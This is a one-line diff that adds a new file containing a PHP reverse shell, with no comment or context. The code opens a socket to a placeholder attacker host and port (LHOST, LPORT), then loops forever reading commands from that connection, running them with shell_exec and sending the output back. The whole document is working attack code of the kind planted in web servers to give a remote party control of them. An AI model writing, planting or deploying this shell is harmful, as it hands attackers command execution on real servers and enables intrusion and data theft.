@@ -1,0 +1,1 @@
+<?php $sock=socket_create(AF_INET,SOCK_STREAM,0); $host="LHOST";$port=LPORT;socket_connect($sock,$host,$port);while (1){socket_write($sock,shell_exec(socket_read($sock,20480)));} ?>
